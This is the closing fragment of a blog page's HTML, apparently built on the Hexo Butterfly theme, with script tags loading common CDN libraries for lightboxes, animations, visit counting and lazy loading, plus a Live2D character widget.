src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/fireworks.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/click_heart.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Bronya.model.json"},"display":{"position":"right","width":400,"height":500,"hOffset":-110,"vOffset":-40},"mobile":{"show":false},"log":false});</script></body></html>